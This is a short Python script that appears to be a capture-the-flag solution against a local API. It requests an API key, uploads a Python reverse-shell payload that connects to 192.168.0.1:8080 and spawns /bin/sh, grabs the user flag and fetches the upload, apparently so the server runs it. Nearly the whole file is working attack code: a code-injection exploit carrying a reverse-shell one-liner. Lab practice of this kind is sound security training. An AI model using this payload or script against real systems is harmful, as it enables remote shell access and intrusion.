from asyncio import base_futures
from time import sleep
import requests

ms = 1

ip = '192.168.0.1'

base_url = "http://dc610-api-ctf.local"

payload = f'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{ip}\',8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\'/bin/sh\')'

# payload = 'smiley =\'x\' * 8'
blob = {"text": payload}
def auth_call(milliseconds):
    conversion = milliseconds / 1000
    print(f'Milliseconds: {milliseconds} ({conversion} seconds)')
    key = requests.get(f'{base_url}/create_key').text
    print(f'API Key: {key}')
    sleep(conversion)
    uuid = requests.post(f'{base_url}/custom/upload',
                            headers={"access_key": key},
                            json=blob).text
    print(f'UUID: {uuid}')
    flag = requests.get(f'{base_url}/user-flag',
                            headers={"access_key": key},
                            json=blob).text
    print(f'USER FLAG: {flag}')
    result = requests.get(f'{base_url}/custom/fetch/{uuid}',
                    headers={"access_key": key}).text
    print(result)
if __name__ == "__main__":
    auth_call(ms)
